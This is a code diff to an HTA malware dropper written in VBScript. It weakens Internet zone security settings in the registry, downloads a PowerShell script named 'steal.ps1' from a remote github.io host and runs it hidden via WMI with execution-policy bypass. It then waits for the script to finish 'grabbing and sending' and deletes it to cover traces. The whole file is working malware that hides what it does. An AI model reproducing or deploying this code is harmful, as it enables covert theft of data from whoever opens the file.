@@ -10,14 +10,14 @@ Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 
-' Disable Timeout Popup
+' 1. Disable Timeout Popups
 sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
 sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201", 0, "REG_DWORD"
 sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2\1201", 0, "REG_DWORD"
 sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201", 0, "REG_DWORD"
 sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\4\1201", 0, "REG_DWORD"
 
-' Download steal.ps1
+' 2. Download steal.ps1
 xh.Open "GET", "https://lozix94-afk.github.io/hahadicexd/steal.ps1", False
 xh.Send
 
@@ -25,19 +25,29 @@ If xh.Status = 200 Then
     ps1Content = xh.responseText
     Set xh = Nothing
 
+    ' 3. Save to temp
     Dim tempPs1 : tempPs1 = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal.ps1"
     Dim f : Set f = fso.CreateTextFile(tempPs1, True)
     f.Write ps1Content
     f.Close
 
-    ' Run via WMI completely hidden (No cmd prompt)
+    ' 4. Run via WMI (NO CMD PROMPT, NO BLACK BOX)
     Dim finalCmd : finalCmd = "powershell.exe -NoP -Exec Bypass -WindowStyle Hidden -File """ & tempPs1 & """"
+    
     Dim wmi: Set wmi = GetObject("winmgmts:\\.\root\cimv2")
     Dim proc: Set proc = wmi.Get("Win32_Process")
     proc.Create finalCmd, Null, Null
+    
+    ' 5. Wait 12 seconds for the script to finish grabbing and sending
+    Dim w: w = Timer()
+    Do While Timer() - w < 12
+    Loop
+    
+    ' 6. Cleanup
+    fso.DeleteFile tempPs1, True
 End If
 
-' Close instantly so no timeout popup appears
+' KILL THE HTA IMMEDIATELY
 window.close()
 </script>
 </head><body></body></html>
